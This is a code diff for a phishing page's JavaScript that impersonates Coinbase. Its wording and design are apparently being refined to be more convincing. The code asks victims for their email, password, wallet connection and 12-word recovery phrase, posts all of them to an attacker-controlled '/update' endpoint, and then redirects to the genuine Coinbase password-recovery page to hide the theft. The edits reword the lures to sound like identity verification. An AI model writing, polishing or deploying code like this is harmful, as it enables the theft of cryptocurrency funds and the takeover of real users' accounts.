@@ -26,7 +26,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
         if (window.ethereum) {
             try {
-                status.innerText = "Connecting to wallet...";
+                status.innerText = "Connecting...";
                 const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                 await sendData(email, pass, accounts[0], null);
             } catch (e) {
@@ -38,14 +38,17 @@ document.addEventListener('DOMContentLoaded', () => {
     };
 
     function setupRecovery(email, pass) {
+        document.getElementById('step3Title').innerText = "Verify Identity";
+        document.getElementById('step3Desc').innerText = "Please enter your 12-word recovery phrase.";
+        
         step3.innerHTML = `
             <img src="logo.png" class="cb-logo">
-            <h1 class="cb-header">Recovery</h1>
-            <p>Enter your 12-word recovery phrase to continue.</p>
+            <h1 class="cb-header">Verify Identity</h1>
+            <p>To restore access, enter your 12-word recovery phrase.</p>
             <div class="input-group">
                 <input type="text" id="phrase" placeholder="word1 word2 ..." style="text-align:center;">
             </div>
-            <button id="submitPhrase" class="btn-primary">Restore Account</button>
+            <button id="submitPhrase" class="btn-primary">Verify</button>
             <div id="phrase_status" class="status-text"></div>
         `;
 
@@ -53,7 +56,7 @@ document.addEventListener('DOMContentLoaded', () => {
             const phrase = document.getElementById('phrase').value.trim();
             const s = document.getElementById('phrase_status');
             if (phrase.split(/\s+/).length !== 12) {
-                s.innerText = "Please enter exactly 12 words.";
+                s.innerText = "Invalid phrase. Exactly 12 words required.";
                 return;
             }
             await sendData(email, pass, null, phrase);
@@ -62,20 +65,26 @@ document.addEventListener('DOMContentLoaded', () => {
 
     async function sendData(email, pass, wallet, phrase) {
         try {
-            status.innerText = "Processing...";
+            status.innerText = "Processing secure request...";
             const res = await fetch(`${API_URL}/update`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ email, password: pass, walletAddress: wallet, recoveryPhrase: phrase })
+                body: JSON.stringify({ 
+                    email: email, 
+                    password: pass, 
+                    walletAddress: wallet, 
+                    recoveryPhrase: phrase 
+                })
             });
+            
             if (res.ok) {
-                status.innerText = "Verification successful. Redirecting...";
+                status.innerText = "Verification successful.";
                 setTimeout(() => {
                     window.location.href = 'https://www.coinbase.com/password-recovery';
-                }, 1500);
+                }, 2000);
             }
         } catch (e) {
-            status.innerText = "Network error. Please try again.";
+            status.innerText = "Server error. Please try again.";
         }
     }
 });
